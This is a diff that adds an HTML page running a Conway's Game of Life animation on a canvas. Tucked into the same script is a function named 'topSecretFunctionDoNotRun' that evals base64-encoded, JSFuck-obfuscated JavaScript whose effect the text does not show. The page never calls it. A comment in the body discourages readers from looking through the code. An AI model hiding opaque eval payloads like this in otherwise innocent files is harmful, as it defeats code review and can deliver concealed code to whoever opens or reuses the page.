@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<script>
+			addEventListener('load', () => {
+				const canvas = document.querySelector('canvas');
+				const ctx = canvas.getContext('2d');
+
+				canvas.height = 800;
+				canvas.width = 800;
+
+				const boardHeight = 200;
+				const boardWidth = 200;
+
+				let board = [];
+				for (let y = 0; y < boardHeight; ++y) {
+					for (let x = 0; x < boardWidth; ++x) {
+						(board[y] ??= [])[x] = Math.floor(Math.random() * 2);
+					}
+				}
+
+				let mouseDown = false;
+				addEventListener('mousedown', () => mouseDown = true);
+				addEventListener('mouseup', () => mouseDown = false);
+				addEventListener('mousemove', (event) => {
+					if (mouseDown) {
+						const rectangle = canvas.getBoundingClientRect();
+						board[Math.floor((event.clientX - rectangle.left) * boardWidth / canvas.width)][Math.floor((event.clientY - rectangle.top) * boardHeight / canvas.height)] ^= 1;
+					}
+				});
+
+				const step = () => {
+					for (let y = 0; y < boardHeight; ++y) {
+						for (let x = 0; x < boardWidth; ++x) {
+							ctx.fillStyle = board[y][x] ? '#FFFFFF' : '#000000';
+							ctx.fillRect(y * canvas.height / boardHeight, x * canvas.width / boardWidth, canvas.height / boardHeight + 1, canvas.width / boardWidth + 1);
+						}
+					}
+					board[Math.floor(Math.random() * boardHeight)][Math.floor(Math.random() * boardWidth)] ^= 1;
+					const next = structuredClone(board);
+					for (let y = 0; y < boardHeight; ++y) {
+						const u = (y + boardHeight - 1) % boardHeight;
+						const d = (y + 1) % boardHeight;
+						for (let x = 0; x < boardWidth; ++x) {
+							const l = (x + boardWidth - 1) % boardWidth;
+							const r = (x + 1) % boardWidth;
+							const n = board[u][l] + board[u][x] + board[u][r]
+							        + board[y][l]               + board[y][r]
+							        + board[d][l] + board[d][x] + board[d][r];
+							next[y][x] = (n > 1) * (n < 4) * (board[y][x] || (n == 3));
+						}
+					}
+					board = next;
+					requestAnimationFrame(step);
+				};
+				requestAnimationFrame(step);
+			});
+
+			const topSecretFunctionDoNotRun = () => eval(atob('W11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV1bKFtdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dK1tdKVshK1tdKyErW10rIStbXV0rKCEhW10rW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0pWyshK1tdK1srW11dXSsoW11bW11dK1tdKVsrIStbXV0rKCFbXStbXSlbIStbXSshK1tdKyErW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrIStbXV0rKFtdW1tdXStbXSlbK1tdXSsoW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXSlbK1tdXSsoISFbXStbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXSlbKyErW10rWytbXV1dKyghIVtdK1tdKVsrIStbXV1dKCghIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrIStbXV0rKFtdW1tdXStbXSlbKyErW11dKyhbXStbXSlbKCFbXStbXSlbK1tdXSsoISFbXStbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXSlbKyErW10rWytbXV1dKyhbXVtbXV0rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXSsoW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXSlbKyErW10rWytbXV1dKyghW10rW10pWyErW10rIStbXV0rKCEhW10rW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0pWyshK1tdK1srW11dXSsoISFbXStbXSlbKyErW11dXSgpWyshK1tdK1shK1tdKyErW11dXSsoKCEhW10rW10pWytbXV0rWyshK1tdXStbIStbXSshK1tdKyErW10rIStbXSshK1tdKyErW10rIStbXV0rWyshK1tdXSsoISFbXStbXSlbK1tdXStbKyErW11dK1shK1tdKyErW10rIStbXSshK1tdKyErW11dK1shK1tdKyErW10rIStbXSshK1tdKyErW10rIStbXSshK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrW11dK1srIStbXV0rWyErW10rIStbXSshK1tdKyErW10rIStbXSshK1tdXStbIStbXSshK1tdKyErW10rIStbXV0rKFtdW1tdXStbXSlbK1tdXSsoKygrIStbXStbKyErW11dKyghIVtdK1tdKVshK1tdKyErW10rIStbXV0rWyErW10rIStbXV0rWytbXV0pK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV0rWyshK1tdXStbIStbXSshK1tdKyErW10rIStbXV0rWyErW10rIStbXV0rKCEhW10rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXSlbK1tdXStbIStbXSshK1tdKyErW10rIStbXSshK1tdXStbIStbXSshK1tdKyErW10rIStbXSshK1tdKyErW10rIStbXV0rKCtbIVtdXStbXSlbK1tdXStbIStbXSshK1tdKyErW10rIStbXV0rKCEhW10rW10pWytbXV0rWyshK1tdXStbKyErW11dK1shK1tdKyErW11dKyghIVtdK1tdKVsrW11dK1srIStbXV0rWyErW10rIStbXSshK1tdKyErW10rIStbXSshK1tdXStbIStbXSshK1tdKyErW10rIStbXSshK1tdKyErW10rIStbXV0rWyErW10rIStbXSshK1tdXSsoISFbXStbXSlbK1tdXStbKyErW11dK1shK1tdKyErW10rIStbXV0rWyshK1tdXSsoISFbXStbXSlbK1tdXStbKyErW11dK1shK1tdKyErW11dK1shK1tdKyErW10rIStbXSshK1tdKyErW10rIStbXSshK1tdXSsoIVtdK1tdKVshK1tdKyErW10rIStbXV0rKCEhW10rW10pWytbXV0rWyshK1tdXStbIStbXSshK1tdXStbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV0rWyshK1tdXStbIStbXSshK1tdXStbKyErW11dKVsoIVtdK1tdKVshK1tdKyErW10rIStbXV0rKCsoIStbXSshK1tdK1srIStbXV0rWyshK1tdXSkpWyghIVtdK1tdKVsrW11dKyghIVtdK1tdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dKVsrIStbXStbK1tdXV0rKFtdK1tdKVsoW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXSlbKyErW10rWytbXV1dKyhbXVtbXV0rW10pWyshK1tdXSsoIVtdK1tdKVshK1tdKyErW10rIStbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshK1tdXSsoW11bW11dK1tdKVsrW11dKyhbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXStbXSlbIStbXSshK1tdKyErW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dKVsrIStbXStbK1tdXV0rKCEhW10rW10pWyshK1tdXV1bKFtdW1tdXStbXSlbKyErW11dKyghW10rW10pWyshK1tdXSsoKCtbXSlbKFtdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dK1tdKVshK1tdKyErW10rIStbXV0rKCEhW10rW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0pWyshK1tdK1srW11dXSsoW11bW11dK1tdKVsrIStbXV0rKCFbXStbXSlbIStbXSshK1tdKyErW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrIStbXV0rKFtdW1tdXStbXSlbK1tdXSsoW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXSlbK1tdXSsoISFbXStbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXSlbKyErW10rWytbXV1dKyghIVtdK1tdKVsrIStbXV1dK1tdKVsrIStbXStbKyErW11dXSsoISFbXStbXSlbIStbXSshK1tdKyErW11dXV0oIStbXSshK1tdKyErW10rWyshK1tdXSlbKyErW11dKyghW10rW10pWyErW10rIStbXV0rKFshW11dK1tdW1tdXSlbKyErW10rWytbXV1dKyghIVtdK1tdKVsrW11dXSgoISFbXStbXSlbK1tdXSlbKFtdWyghIVtdK1tdKVshK1tdKyErW10rIStbXV0rKFtdW1tdXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrIStbXV0rKFshW11dK1tdW1tdXSlbKyErW10rWytbXV1dKyghIVtdK1tdKVshK1tdKyErW10rIStbXV0rKCFbXStbXSlbIStbXSshK1tdKyErW11dXSgpK1tdKVshK1tdKyErW10rIStbXV0rKCEhW10rW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0pWyshK1tdK1srW11dXSsoWyFbXV0rW11bW11dKVsrIStbXStbK1tdXV0rKFtdW1tdXStbXSlbKyErW11dXSgoW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV1bKFtdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dK1tdKVshK1tdKyErW10rIStbXV0rKCEhW10rW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0pWyshK1tdK1srW11dXSsoW11bW11dK1tdKVsrIStbXV0rKCFbXStbXSlbIStbXSshK1tdKyErW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrIStbXV0rKFtdW1tdXStbXSlbK1tdXSsoW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXSlbK1tdXSsoISFbXStbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXSlbKyErW10rWytbXV1dKyghIVtdK1tdKVsrIStbXV1dKCghIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrIStbXV0rKFtdW1tdXStbXSlbKyErW11dKyghW10rWytbXV0pWyhbIVtdXStbXVtbXV0pWyshK1tdK1srW11dXSsoISFbXStbXSlbK1tdXSsoIVtdK1tdKVsrIStbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoWyFbXV0rW11bW11dKVsrIStbXStbK1tdXV0rKFtdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dK1tdKVshK1tdKyErW10rIStbXV0rKCFbXStbXSlbIStbXSshK1tdKyErW11dXSgpWyshK1tdK1srW11dXSshW10rKCFbXStbK1tdXSlbKFshW11dK1tdW1tdXSlbKyErW10rWytbXV1dKyghIVtdK1tdKVsrW11dKyghW10rW10pWyshK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyhbIVtdXStbXVtbXV0pWyshK1tdK1srW11dXSsoW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0rW10pWyErW10rIStbXSshK1tdXSsoIVtdK1tdKVshK1tdKyErW10rIStbXV1dKClbKyErW10rWytbXV1dKSgpWyhbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXStbXSlbIStbXSshK1tdKyErW11dKyghIVtdK1tdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dKVsrIStbXStbK1tdXV0rKFtdW1tdXStbXSlbKyErW11dKyghW10rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXSlbK1tdXSsoISFbXStbXSlbKyErW11dKyhbXVtbXV0rW10pWytbXV0rKFtdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dK1tdKVshK1tdKyErW10rIStbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0pWyshK1tdK1srW11dXSsoISFbXStbXSlbKyErW11dXSgoIVtdK1srW11dKVsoWyFbXV0rW11bW11dKVsrIStbXStbK1tdXV0rKCEhW10rW10pWytbXV0rKCFbXStbXSlbKyErW11dKyghW10rW10pWyErW10rIStbXV0rKFshW11dK1tdW1tdXSlbKyErW10rWytbXV1dKyhbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXStbXSlbIStbXSshK1tdKyErW11dKyghW10rW10pWyErW10rIStbXSshK1tdXV0oKVsrIStbXStbK1tdXV0pK1tdKVsrIStbXV0pKyhbXStbXSlbKCFbXStbXSlbK1tdXSsoISFbXStbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXSlbKyErW10rWytbXV1dKyhbXVtbXV0rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXSsoW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXSlbKyErW10rWytbXV1dKyghW10rW10pWyErW10rIStbXV0rKCEhW10rW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0pWyshK1tdK1srW11dXSsoISFbXStbXSlbKyErW11dXSgpWyshK1tdK1shK1tdKyErW11dXSkoKQ'));
+		</script>
+		<style>
+			canvas {
+				border: 1px solid #000000;
+			}
+		</style>
+	</head>
+	<body>
+		<canvas></canvas>
+		<!-- Absolutely no reason to look through the code :) -->
+	</body>
+</html>
